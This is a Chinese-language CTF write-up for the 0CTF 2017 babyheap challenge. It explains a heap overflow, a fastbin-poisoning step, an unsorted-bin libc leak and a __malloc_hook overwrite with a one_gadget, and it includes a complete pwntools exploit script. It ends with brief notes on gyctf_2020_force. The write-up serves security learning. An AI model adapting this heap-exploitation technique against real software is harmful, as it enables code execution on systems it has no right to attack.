---
title: "0ctf2017babyheap"
date: 2026-11-13 19:08:05
categories:
  - "题目复现"
  - "0CTF"
tags: ["unsorted-bin"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#6 -->
看ai说只是修改两个小堆块，修改其中一个的size之后释放，使得两个小堆块进入unsortedbin 之后再次申请小的，其中一个被取出，另一个仍在unsortedbin中，之后查看内容，其fd和bk即是原始的数据区，当然是另一个小堆块，即可泄露出libc的相关地址

![image-20261015182358632](/pwn-notes/images/notes/image-20261015182358632.png)

保护全开，或许堆题查看保护只是看它是多少位的

64位

ida查看关键函数

![image-20261015183255429](/pwn-notes/images/notes/image-20261015183255429.png)

添加函数，限制size大小

![image-20261015183416440](/pwn-notes/images/notes/image-20261015183416440.png)

编辑函数，这里可以自己定义内容大小，应该可以堆溢出



![image-20261015183508344](/pwn-notes/images/notes/image-20261015183508344.png)

释放函数，指针清零，没有uaf啥的

![image-20261015183549246](/pwn-notes/images/notes/image-20261015183549246.png)

退出函数

额，这么一想，好像查看保护也挺有用，这道题保护全开，嘶，也没有uaf。

不对，保护全开，基址是变化的，所以需要泄露libc基址

那么泄露完之后呢

![image-20261016154035435](/pwn-notes/images/notes/image-20261016154035435.png)

结构体呢？分配的堆块呢？

那么再编辑一下内容

![image-20261016154307970](/pwn-notes/images/notes/image-20261016154307970.png)

![image-20261016154400956](/pwn-notes/images/notes/image-20261016154400956.png)

这个倒是看起来挺正常的，就是挺干净的

![image-20261016154706416](/pwn-notes/images/notes/image-20261016154706416.png)

挺正常

感觉可以直接dump出来

![image-20261016154911013](/pwn-notes/images/notes/image-20261016154911013.png)

哦，原来没有相关的指针了，被清零了。

编辑函数中有堆溢出。怎么用？

哦哦，修改小堆块的size之后，让他们进入unsortedbin

![image-20261017094927733](/pwn-notes/images/notes/image-20261017094927733.png)

主要有5个堆块，第一个来进行溢出，使得第2个第3个进入fastbin之后，修改指针指向第5个堆块，之后

![image-20261017100847801](/pwn-notes/images/notes/image-20261017100847801.png)



![image-20261017101946239](/pwn-notes/images/notes/image-20261017101946239.png)

写入位置，修改位置，修改位置的值



![image-20261017102121675](/pwn-notes/images/notes/image-20261017102121675.png)

此时已经修改过来了，此时需要申请来再次指向这个chunk4,但是它处于的是0x20大小的列表中，所以还需要修改chunk4的大小。

这个时候需要借助chunk3进行堆溢出修改

![image-20261017102510540](/pwn-notes/images/notes/image-20261017102510540.png)

写入位置，修改的值

![image-20261017102748001](/pwn-notes/images/notes/image-20261017102748001.png)

修改完成

接下来申请。

![image-20261017102952669](/pwn-notes/images/notes/image-20261017102952669.png)

此时列表中什么都没有，所以就是原来的2序号就是指向了chunk4

但是4序号还是指向chunk4

这时泄露libc地址，需要chunk4进入unsoretdbin,之后需要将chunk4的size改回去

![image-20261017105427363](/pwn-notes/images/notes/image-20261017105427363.png)

释放

![image-20261017105709616](/pwn-notes/images/notes/image-20261017105709616.png)

接下来借助chun2来泄露

![image-20261017113215330](/pwn-notes/images/notes/image-20261017113215330.png)



![image-20261017113229609](/pwn-notes/images/notes/image-20261017113229609.png)

终于接收到了

接下来计算Libc基址

![image-20261017160122329](/pwn-notes/images/notes/image-20261017160122329.png)

直接就是泄露出来的再减去这个就是

![image-20261017161110837](/pwn-notes/images/notes/image-20261017161110837.png)

查看malloc_hook附近的函数，然后在进行伪造，使得能够修改其附近的地址。

接下来就是修改

![image-20261017162351962](/pwn-notes/images/notes/image-20261017162351962.png)

![image-20261017162507225](/pwn-notes/images/notes/image-20261017162507225.png)

所以weizaochunk的地址就是libc基址再加上0x3c4aed.

然后就是fastbin中修改chunk，之后的话再去更改其fd指针，之后再次申请就可以获得这个fake_chunk,之后再写入就可以。

因为是7a

所以申请的大小应该是0x60,

![image-20261017165018457](/pwn-notes/images/notes/image-20261017165018457.png)

真的在第四个，一开始还不知道为什么又删除的是第四个

![image-20261017165222038](/pwn-notes/images/notes/image-20261017165222038.png)

即是修改其fd指针

因为2号和4号都是

所以直接通过修改2号来进行fd修改

![image-20261017171305470](/pwn-notes/images/notes/image-20261017171305470.png)

liubc居然弄错了，0a20空格和换行

![image-20261017172724693](/pwn-notes/images/notes/image-20261017172724693.png)

![image-20261017172815607](/pwn-notes/images/notes/image-20261017172815607.png)

也是成功指过去了

在原来的堆块里面找了半天，地址就不在那里面还找，其实可以写入一些数据，看看是否能写入那个函数附近

![image-20261017175018550](/pwn-notes/images/notes/image-20261017175018550.png)

好呀，也是成功的把aaaa写进去了

那么接下来算到malloc_hook的偏移

0x7ff4678e3b10 malloc_hook函数地址

0x7ff4678e3afd  写入地址

相差0x13

![image-20261017180053556](/pwn-notes/images/notes/image-20261017180053556.png)

改完了，接下来只需要申请一下调用这个函数就可以

这个和wp中的不一样，用的本地的

![image-20261017181703060](/pwn-notes/images/notes/image-20261017181703060.png)

exp:

```python
from pwn import*
r=process('./pwn')
context.log_level='debug'
#gdb.attach(r)
def add(size):
	r.recvuntil(b':')
	r.sendline(b'1')
	r.recvuntil(b':')
	r.sendline(str(size))

def edit(idx,size,content):
	r.recvuntil(b':')
	r.sendline(b'2')
	r.recvuntil(b':')
	r.sendline(str(idx))
	r.recvuntil(b':')
	r.sendline(str(size))
	r.recvuntil(b':')
	r.sendline(content)

def delete(idx):
	r.recvuntil(b':')
	r.sendline(b'3')
	r.recvuntil(b':')
	r.sendline(str(idx))

def dump(idx):
    r.recvuntil(b':')
    r.sendline(b'4')
    r.recvuntil(b':')
    r.sendline(str(idx))

add(0x10)
add(0x10)
add(0x10)
add(0x10)
add(0x80)
add(0x10)

delete(1)
delete(2)

pay=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
edit(0,len(pay),pay)

pay1=p64(0)*3+p64(0x21)
edit(3,len(pay1),pay1)

add(0x10)
add(0x10)

pay2=p64(0)*3+p64(0x91)
edit(3,len(pay2),pay2)

delete(4)

dump(2)
r.recvuntil(b'Content: \n')
addr=(r.recv(6)).ljust(8,b'\x00')
print(u64(addr))
libase=u64(addr)-0x3c4b78
print(libase)
#pause()

fake_chunk=libase+0x3c4aed
add(0x60)
delete(4)
edit(2,len(p64(fake_chunk)),p64(fake_chunk))

add(0x60)
add(0x60)

pay3=b'a'*0x13+p64(libase+0x4527a)
#pay3=p8(0)*3+p64(0)*2+p64(libase+0x4526a)

edit(6,len(pay3),pay3)

add(0x50)

r.interactive()


```







![image-20261017181610483](/pwn-notes/images/notes/image-20261017181610483.png)

**gyctf_2020_force**

![image-20261025153237158](/pwn-notes/images/notes/image-20261025153237158.png)

![image-20261025153511815](/pwn-notes/images/notes/image-20261025153511815.png)

简单的增加一个堆块，但是size并没有限制，然后增加内容。并且展示新增加的堆块的地址

好吧其实是有限制的，只能读入50字节。

<!-- sync-hash: a73a51f93e41571aa7f7b576043f2372f1db9dbb80f8c9b5951c953535185638 -->
